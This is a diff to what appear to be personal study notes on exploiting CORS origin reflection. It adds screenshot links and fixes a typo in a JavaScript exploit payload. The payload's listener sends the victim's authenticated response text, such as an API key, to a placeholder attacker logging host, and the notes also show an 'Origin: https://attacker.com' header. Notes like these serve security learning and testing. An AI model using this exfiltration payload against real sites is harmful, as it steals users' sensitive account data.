@@ -24,11 +24,17 @@ Access-Control-Allow-Credentials: true
 ```
 # Basic Origin Reflection
 
-Always check for any requests for any of the specified headers. For example, account details may include the ACAC header, suggesting CORS in place. In that case, send an Origin header:
+Always check for any requests for any of the specified headers. For example, account details may include the ACAC header, suggesting CORS in place:
+
+![[ACAC Header.png]]
+
+In that case, send an Origin header:
 
 ```json
 Origin: https://attacker.com
 ```
+
+![[Origin Header.png]]
 
 The app may allow any Origin to submit a cross-origin request and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:
 
@@ -54,7 +60,7 @@ Some payloads work, some don't:
 	req.send();
 
 	function reqListener() {
-		loation = 'https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+this.responseText;
+		location = 'https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+this.responseText;
 	};
 </script>
 </html>
